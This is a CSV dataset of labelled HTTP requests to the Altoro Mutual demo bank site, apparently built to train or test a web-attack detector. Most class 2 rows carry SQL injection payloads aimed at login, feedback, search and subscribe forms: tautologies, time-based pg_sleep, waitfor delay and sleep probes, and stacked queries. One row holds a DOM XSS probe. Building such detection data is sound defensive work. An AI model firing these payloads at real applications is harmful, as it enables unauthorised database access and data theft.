method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/punycode,,0,0,0,0,0,0,1
GET,/feedback.jsp,,0,0,0,0,0,0,1
GET,/v2,,0,0,0,0,0,0,1
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,1
GET,/search.jsp,,0,0,0,0,0,0,1
GET,/v2/swagger.json,,0,0,0,0,0,0,1
GET,/react,,0,0,0,0,0,0,1
GET,/doSubscribe,,0,0,0,0,0,0,1
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,1
GET,/licenses/mit-license.php,,0,0,0,0,0,0,1
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,1
GET,/1998,,0,0,0,0,0,0,1
GET,/pr,,0,0,0,0,0,0,1
GET,/index.jsp,,0,0,0,0,0,0,1
GET,/swagger/properties.json,,0,0,0,0,0,0,1
GET,/jonschlinkert,,0,0,0,0,0,0,1
GET,/altoro/images/gradient.jpg,,0,0,0,0,0,0,1
GET,/Starcounter-Jack,,0,0,0,0,0,0,1
GET,/use-check-prop-types,,0,0,0,0,0,0,1
GET,/validator,,0,0,0,0,0,0,1
GET,/1998/Math/MathML,,0,0,0,0,0,0,1
GET,/classnames,,0,0,0,0,0,0,1
GET,/XML/1998,,0,0,0,0,0,0,1
GET,/1999/xlink,,0,0,0,0,0,0,1
GET,/react/docs,,0,0,0,0,0,0,1
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,1
GET,/search.jsp?query=1,,0,0,0,0,0,0,1
GET,/util/,,0,0,0,0,0,0,1
GET,/my%20documents,,0,0,0,0,1,0,1
GET,/default.jsp,,0,0,0,0,0,0,1
GET,/XML,,0,0,0,0,0,0,1
GET,/doLogin,,0,0,0,0,0,0,1
GET,/inside_points_of_interest.htm,,0,0,0,0,0,0,1
GET,/images,,0,0,0,0,0,0,1
GET,/robots.txt,,0,0,0,0,0,0,1
GET,/Starcounter-Jack/JSON-Patch,,0,0,0,0,0,0,1
GET,/util,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Findex.html%23%2F1._Login%2Fproperties.json,,0,0,0,0,0,0,1
GET,/2000,,0,0,0,0,0,0,1
GET,/altoro,,0,0,0,0,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents,,0,0,0,0,3,0,1
GET,/gregjacobs,,0,0,0,0,0,0,1
GET,/react/docs/error-decoder.html?invariant=,,0,0,0,0,0,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/login.jsp,,0,0,0,0,0,0,1
GET,/gregjacobs/Autolinker.js,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
GET,/swagger/index.html,,0,0,0,0,0,0,1
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=glvysyjs&subject=1,0,0,0,0,0,0,1
GET,/2000/svg,,0,0,0,0,0,0,1
GET,/licenses,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
GET,/cgi-bin/le_check_v3.exe,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,1
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,1
GET,/1999/xhtml,,0,0,0,0,0,0,1
GET,/swagger,,0,0,0,0,0,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,1
GET,/sitemap.xml,,0,0,0,0,0,0,1
GET,/sitemap.xml.gz,,0,0,0,0,0,0,1
GET,/1999,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,1
GET,/XML/1998/namespace,,0,0,0,0,0,0,1
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,1
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,1
GET,/Xq22NIvq,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Findex.html%23%2Fproperties.json,,0,0,0,0,0,0,1
GET,/survey_questions.jsp,,0,0,0,0,0,0,1
GET,/status_check.jsp,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Fproperties.json,,0,0,0,0,0,0,1
GET,/validator?url=http%3A%2F%2Fdemo.testfire.net%2Fswagger%2Findex.html%23%2Fjavascript%3AdomxssExecutionSink(1%2C%22'%5C%22%3E%3Cxsstag%3E()hashxss%22)%2Fproperties.json,,1,3,0,2,0,0,1
GET,/1998/Math,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,1
GET,/retirement.htm,,0,0,0,0,0,0,1
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,1
GET,/high_yield_investments.htm,,0,0,0,0,0,0,1
GET,/IKdLGmOC,,0,0,0,0,0,0,1
GET,/,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,1
GET,/sendFeedback,,0,0,0,0,0,0,1
GET,/security.htm,,0,0,0,0,0,0,1
GET,/images/,,0,0,0,0,0,0,1
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,1
GET,/oauth2-redirect.html,,0,0,0,0,0,0,1
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,1
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,1
GET,/altoro/images,,0,0,0,0,0,0,1
GET,/subscribe.jsp,,0,0,0,0,0,0,1
GET,/acunetix-wvs-test-for-some-inexistent-file,,0,0,0,0,0,0,1
GET,/my%20documents/JohnSmith,,0,0,0,0,1,0,1
GET,/Orcl1bAn,,0,0,0,0,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,,0,0,0,0,3,0,1
GET,/favicon.ico,,0,0,0,0,0,0,1
GET,/swagger/,,0,0,0,0,0,0,1
GET,/pr/,,0,0,0,0,0,0,1
GET,/jonschlinkert/repeat-string,,0,0,0,0,0,0,1
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,1
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=JyI=,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%bf'%bf""",1,1,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=rfgRYQo8,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0""XOR(if(now()=sysdate()%2csleep(10)%2c0))XOR""Z&subject=1",0,2,0,5,0,1,2
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b219-219-1=0%2b0%2b0%2b1%20or%20'AYK2X5ky'=',,4,0,0,0,4,0,2
POST,/doLogin,btnSubmit=Login&passw=%40%40MxpPe&uid=1,0,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b730-730-1=0%2b0%2b0%2b1%20or%20'2AZPYuil'=',4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%5c,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b869-869)&name=tmtqptlo&subject=1,0,0,0,1,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z&name=tmtqptlo&subject=1,2,0,0,5,0,1,2
GET,/search.jsp?query=-1%20OR%202%2b698-698-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=o3Qg54Np');select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=1%00%c0%a7%c0%a2%252527%252522&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/index.jsp?content=%40%40IIgrS,,0,0,0,0,0,0,2
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,2,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1'%20OR%202%2b803-803-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,0,0,2
GET,/search.jsp?query=%5c,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=4AQV32E1';select%20pg_sleep(3);%20--%20,1,0,1,1,0,3,2
POST,/sendFeedback,submit=Submit&cfile=1acuWCufqYELQC&comments=1&email_addr=sample%40email.tst&name=hrcbkxgn&subject=1,0,0,0,0,0,0,2
GET,/index.jsp?content=-1%20OR%203%2b906-906-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/doLogin,btnSubmit=Login&passw=JyI=&uid=1,0,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf""&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=SmSMPqQp');select%20pg_sleep(15);%20--%20&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2csleep(5)%2c0)&subject=1,0,0,0,4,0,1,2
GET,/search.jsp?query=JfBlKlIX';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
GET,/survey_questions.jsp?step=-1%20OR%203%2b11-11-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1acuXRyiXu1UhX&name=hrcbkxgn&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8=6*8%20AND%20'63VZ'!='63VZ%25&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/survey_questions.jsp?step=b%25'%20AND%202*3*8=6*8%20AND%20'i982'!='i982%25,,4,0,0,0,4,0,2
GET,/search.jsp?query=-1;%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=hORfg1tv&subject=1,0,0,0,0,0,0,2
GET,/search.jsp,,0,0,0,0,0,0,2
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=yLci0Exd'));select%20pg_sleep(3);%20--%20&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,0,3,2
GET,/survey_questions.jsp?step=5dR98IIN';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,2
POST,/sendFeedback,"submit=Submit&cfile=1'""&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,2
GET,/index.jsp?content=efI1lsnv');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=KipYzD4J');select%20pg_sleep(6);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b869-869)&name=tmtqptlo&subject=1,0,0,0,1,0,0,2
GET,/search.jsp?query=%40%40rqivn,,0,0,0,0,0,0,2
GET,/feedback.jsp,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=3VpOm7sh&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=Mj3yP2Hj';%20waitfor%20delay%20'0:0:9'%20--%20&name=tmtqptlo&subject=1,3,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b393-393-1=0%2b0%2b0%2b1%20or%20'Qd3OvlVo'='&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,2
GET,/search.jsp?query=-1;select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b207-207-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b855-855-1=0%2b0%2b0%2b1%20--%20&uid=1,1,0,1,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%bf'%bf""&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/search.jsp?query=1,,0,0,0,0,0,0,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%f0''%f0""""",2,2,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b658-658-1=0%2b0%2b0%2b1%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=%40%40mXQVG&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/images,,0,0,0,0,0,0,2
GET,/swagger,,0,0,0,0,0,0,2
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=5a5ylBxh');select%20pg_sleep(6);%20--%20,1,0,1,1,0,3,2
POST,/sendFeedback,submit=Submit&cfile=z9tWFEQO'));select%20pg_sleep(3);%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,2
GET,/search.jsp?query=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=1'""&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=tCjexRoH';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,0,2,2
GET,/search.jsp?query=-1);%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,2
GET,/retirement.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z",0,2,0,5,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=-1""%20OR%202%2b677-677-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,1,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%40%40ynFiz,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b558-558-1=0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1%20OR%202%2b551-551-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=la9qVR1W';select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=42g86ty3'));select%20pg_sleep(15);%20--%20&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'""&subject=1",1,1,0,0,0,0,2
GET,/login.jsp,,0,0,0,0,0,0,2
GET,/subscribe.jsp,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%20waitfor%20delay%20'0:0:6'%20--%20&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/index.jsp?content=%5c,,0,0,0,0,0,0,2
GET,/search.jsp?query=bwTJmpFn,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=p26oykm8'));select%20pg_sleep(9);%20--%20,1,0,1,1,0,3,2
GET,/index.jsp,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b483-483-1=0%2b0%2b0%2b1%20or%20'7MtIA4C0'=',4,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0""""&subject=1",2,2,0,0,0,0,2
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=NWkDosWa';select%20pg_sleep(3);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=if(now()=sysdate()%2csleep(9)%2c0)&name=tmtqptlo&subject=1,0,0,0,4,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%407tepu,0,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,0,3,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1acuYFWvoeUaBk&email_addr=sample%40email.tst&name=hrcbkxgn&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b658-658)%20or%20'AIdsYtEP'='&uid=1,4,0,0,1,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,2,0,0,5,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=8jUj1Kzi'));select%20pg_sleep(9);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b420-420-1=0%2b0%2b0%2b1&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b458-458-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=DkIvryQd');select%20pg_sleep(6);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2%252527%252522&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b539-539-1=0%2b0%2b0%2b1%20--%20&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b844-844-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b947-947-1=0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:6'%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/index.jsp?content=-1%20OR%202%2b854-854-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,9,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/search.jsp?query=nv1N3R4Y';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1acuieKEIaM5tx,0,0,0,0,0,1,2
GET,/search.jsp?query=-1%20OR%203%2b698-698-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b458-458-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b726-726-1=0%2b0%2b0%2b1,0,0,0,0,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b183-183-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=cqgijfvf&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b748-748-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,0,0,0,2
GET,/survey_questions.jsp?step=1acu4Zzgv44Vv5,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=-1%20OR%202%2b11-11-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
GET,/util/serverStatusCheckService.jsp?HostName=%5c,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=-1%20OR%202%2b617-617-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst'%20AND%202*3*8=6*8%20AND%20'5Rlm'='5Rlm&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/util,,0,0,0,0,0,0,2
GET,/index.jsp?content=personal_loans.htm'%20AND%202*3*8=6*8%20AND%20'guol'='guol,,4,0,0,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/",2,2,0,15,0,9,2
GET,/util/serverStatusCheckService.jsp?HostName=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,0,3,2
POST,/doLogin,btnSubmit=Login&passw=1%00%c0%a7%c0%a2%252527%252522&uid=1,0,0,0,0,0,1,2
GET,/util/serverStatusCheckService.jsp?HostName=%40%40TYoDK,,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=1acuLo7T6pWvt9,,0,0,0,0,0,0,2
GET,/index.jsp?content=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%40%40WDZvX&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1);select%20pg_sleep(9);%20--%20,0,0,1,1,0,2,2
GET,/util/serverStatusCheckService.jsp?HostName=ecekNyoX'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b593-593-1=0%2b0%2b0%2b1%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b658-658)%20or%20'AIdsYtEP'='&uid=1,4,0,0,1,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=ySa6ZG3u&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=pfhRDYHL';select%20pg_sleep(6);%20--%20&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
GET,/survey_questions.jsp?step=FdIXL0df'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,2
POST,/doLogin,btnSubmit=Login&passw=1acurM6M3DVvQL&uid=1,0,0,0,0,0,1,2
GET,/index.jsp?content=-1%20OR%202%2b906-906-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
